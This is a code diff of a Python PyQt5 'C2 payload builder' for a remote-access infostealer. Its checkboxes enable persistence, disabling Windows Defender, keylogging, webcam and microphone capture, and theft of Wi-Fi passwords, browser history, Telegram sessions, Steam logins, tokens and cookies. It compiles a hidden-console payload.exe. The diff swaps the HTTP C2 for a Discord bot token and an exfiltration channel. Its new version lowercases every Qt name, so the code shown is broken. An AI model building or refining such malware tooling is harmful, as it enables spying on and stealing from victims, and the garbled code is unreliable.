@@ -1,104 +1,107 @@
 import sys, json, subprocess, os
-from PyQt5.QtWidgets import *
-from PyQt5.QtCore import Qt
+from pyqt5.qtwidgets import *
+from pyqt5.qtcore import qt
 
-class BuilderGUI(QMainWindow):
+class buildergui(qmainwindow):
     def __init__(self):
         super().__init__()
-        self.setWindowTitle("C2 Payload Builder")
-        self.setGeometry(100, 100, 720, 850)
-        central = QWidget()
-        layout = QVBoxLayout()
+        self.setwindowtitle("discord c2 builder")
+        self.setgeometry(100, 100, 720, 850)
+        central = qwidget()
+        layout = qvboxlayout()
 
-        features_group = QGroupBox("Features")
-        features_layout = QVBoxLayout()
-        self.cb_persist = QCheckBox("Persistence")
-        self.cb_defender = QCheckBox("Disable Defender")
-        self.cb_keylog = QCheckBox("Keylogger")
-        self.cb_webcam = QCheckBox("Webcam")
-        self.cb_screenshot = QCheckBox("Screenshot")
-        self.cb_screenrec = QCheckBox("Screen Recording")
-        self.cb_mic = QCheckBox("Microphone")
-        self.cb_file_search = QCheckBox("File Search")
-        self.cb_wifi = QCheckBox("Wi-Fi Passwords")
-        self.cb_clipboard = QCheckBox("Clipboard")
-        self.cb_history = QCheckBox("Browser History")
-        self.cb_telegram = QCheckBox("Telegram Sessions")
-        self.cb_steam = QCheckBox("Steam Login")
-        self.cb_tokens = QCheckBox("Tokens + Cookies + Roblox")
-        for cb in [self.cb_persist, self.cb_defender, self.cb_keylog, self.cb_webcam,
-                   self.cb_screenshot, self.cb_screenrec, self.cb_mic, self.cb_file_search,
-                   self.cb_wifi, self.cb_clipboard, self.cb_history, self.cb_telegram,
-                   self.cb_steam, self.cb_tokens]:
-            features_layout.addWidget(cb)
-        features_group.setLayout(features_layout)
+        groupfeat = qgroupbox("features")
+        layoutfeat = qvboxlayout()
+        self.cbpersist = qcheckbox("persistence")
+        self.cbdefender = qcheckbox("disable defender")
+        self.cbkeylog = qcheckbox("keylogger")
+        self.cbwebcam = qcheckbox("webcam")
+        self.cbscreenshot = qcheckbox("screenshot")
+        self.cbscreenrec = qcheckbox("screen recording")
+        self.cbmic = qcheckbox("microphone")
+        self.cbfilesearch = qcheckbox("file search")
+        self.cbwifi = qcheckbox("wifi passwords")
+        self.cbclip = qcheckbox("clipboard")
+        self.cbhistory = qcheckbox("browser history")
+        self.cbtelegram = qcheckbox("telegram sessions")
+        self.cbsteam = qcheckbox("steam login")
+        self.cbtokens = qcheckbox("tokens + cookies + roblox")
+        for cb in [self.cbpersist, self.cbdefender, self.cbkeylog, self.cbwebcam,
+                   self.cbscreenshot, self.cbscreenrec, self.cbmic, self.cbfilesearch,
+                   self.cbwifi, self.cbclip, self.cbhistory, self.cbtelegram,
+                   self.cbsteam, self.cbtokens]:
+            layoutfeat.addwidget(cb)
+        groupfeat.setlayout(layoutfeat)
 
-        params_group = QGroupBox("C2 Parameters")
-        params_layout = QFormLayout()
-        self.c2_url = QLineEdit("http://localhost:5000")
-        self.webhook = QLineEdit("https://discord.com/api/webhooks/...")
-        self.poll_interval = QLineEdit("30")
-        self.file_exts = QLineEdit(".txt,.doc,.pdf,.jpg,.wallet")
-        self.max_file_size = QLineEdit("10")
-        self.record_seconds = QLineEdit("30")
-        params_layout.addRow("C2 URL:", self.c2_url)
-        params_layout.addRow("Webhook:", self.webhook)
-        params_layout.addRow("Poll interval (s):", self.poll_interval)
-        params_layout.addRow("File extensions:", self.file_exts)
-        params_layout.addRow("Max file size (MB):", self.max_file_size)
-        params_layout.addRow("Record seconds:", self.record_seconds)
-        params_group.setLayout(params_layout)
+        groupparams = qgroupbox("discord settings")
+        layoutparams = qformlayout()
+        self.bottoken = qlineedit("your bot token")
+        self.commandchan = qlineedit("command channel id")
+        self.exfilchan = qlineedit("exfil channel id")
+        self.pollinterval = qlineedit("30")
+        self.fileexts = qlineedit(".txt,.doc,.pdf,.jpg,.wallet")
+        self.maxsize = qlineedit("10")
+        self.recordsec = qlineedit("30")
+        layoutparams.addrow("bot token:", self.bottoken)
+        layoutparams.addrow("command channel id:", self.commandchan)
+        layoutparams.addrow("exfil channel id:", self.exfilchan)
+        layoutparams.addrow("poll interval (s):", self.pollinterval)
+        layoutparams.addrow("file extensions:", self.fileexts)
+        layoutparams.addrow("max file size (mb):", self.maxsize)
+        layoutparams.addrow("record seconds:", self.recordsec)
+        groupparams.setlayout(layoutparams)
 
-        output_group = QGroupBox("Output")
-        output_layout = QHBoxLayout()
-        self.output_file = QLineEdit("payload.exe")
-        output_layout.addWidget(QLabel("Filename:"))
-        output_layout.addWidget(self.output_file)
-        output_group.setLayout(output_layout)
+        groupout = qgroupbox("output")
+        layoutout = qhboxlayout()
+        self.outfile = qlineedit("payload.exe")
+        layoutout.addwidget(qlabel("filename:"))
+        layoutout.addwidget(self.outfile)
+        groupout.setlayout(layoutout)
 
-        self.build_btn = QPushButton("Build Payload")
-        self.build_btn.clicked.connect(self.build_payload)
+        self.buildbtn = qpushbutton("build payload")
+        self.buildbtn.clicked.connect(self.build)
 
-        layout.addWidget(features_group)
-        layout.addWidget(params_group)
-        layout.addWidget(output_group)
-        layout.addWidget(self.build_btn)
-        central.setLayout(layout)
-        self.setCentralWidget(central)
+        layout.addwidget(groupfeat)
+        layout.addwidget(groupparams)
+        layout.addwidget(groupout)
+        layout.addwidget(self.buildbtn)
+        central.setlayout(layout)
+        self.setcentralwidget(central)
 
-    def build_payload(self):
+    def build(self):
         config = {
-            "c2_url": self.c2_url.text(),
-            "webhook": self.webhook.text(),
-            "poll_interval": int(self.poll_interval.text()),
-            "persist": self.cb_persist.isChecked(),
-            "disable_defender": self.cb_defender.isChecked(),
-            "keylog": self.cb_keylog.isChecked(),
-            "webcam": self.cb_webcam.isChecked(),
-            "screenshot": self.cb_screenshot.isChecked(),
-            "screenrec": self.cb_screenrec.isChecked(),
-            "mic": self.cb_mic.isChecked(),
-            "file_search": self.cb_file_search.isChecked(),
-            "wifi": self.cb_wifi.isChecked(),
-            "clipboard": self.cb_clipboard.isChecked(),
-            "history": self.cb_history.isChecked(),
-            "telegram": self.cb_telegram.isChecked(),
-            "steam": self.cb_steam.isChecked(),
-            "tokens": self.cb_tokens.isChecked(),
-            "file_exts": self.file_exts.text(),
-            "max_file_size_mb": int(self.max_file_size.text()),
-            "record_seconds": int(self.record_seconds.text())
+            "bottoken": self.bottoken.text(),
+            "commandchan": int(self.commandchan.text()),
+            "exfilchan": int(self.exfilchan.text()),
+            "pollinterval": int(self.pollinterval.text()),
+            "persist": self.cbpersist.ischecked(),
+            "disabledefender": self.cbdefender.ischecked(),
+            "keylog": self.cbkeylog.ischecked(),
+            "webcam": self.cbwebcam.ischecked(),
+            "screenshot": self.cbscreenshot.ischecked(),
+            "screenrec": self.cbscreenrec.ischecked(),
+            "mic": self.cbmic.ischecked(),
+            "filesearch": self.cbfilesearch.ischecked(),
+            "wifi": self.cbwifi.ischecked(),
+            "clipboard": self.cbclip.ischecked(),
+            "history": self.cbhistory.ischecked(),
+            "telegram": self.cbtelegram.ischecked(),
+            "steam": self.cbsteam.ischecked(),
+            "tokens": self.cbtokens.ischecked(),
+            "fileexts": self.fileexts.text(),
+            "maxfilesizemb": int(self.maxsize.text()),
+            "recordseconds": int(self.recordsec.text())
         }
-        with open("payload_stub.py", "r") as f:
+        with open("payloadstub.py", "r") as f:
             stub = f.read()
-        stub = f"CONFIG = {json.dumps(config, indent=4)}\n\n" + stub
+        stub = f"config = {json.dumps(config, indent=4)}\n\n" + stub
         with open("payload_compiled.py", "w") as f:
             f.write(stub)
-        subprocess.run(["pyinstaller", "--onefile", "--noconsole", "payload_compiled.py", "-o", self.output_file.text()])
-        QMessageBox.information(self, "Done", f"Payload saved as {self.output_file.text()}")
+        subprocess.run(["pyinstaller", "--onefile", "--noconsole", "payload_compiled.py", "-o", self.outfile.text()])
+        qmessagebox.information(self, "done", f"payload saved as {self.outfile.text()}")
 
 if __name__ == "__main__":
-    app = QApplication(sys.argv)
-    window = BuilderGUI()
+    app = qapplication(sys.argv)
+    window = buildergui()
     window.show()
     sys.exit(app.exec_())
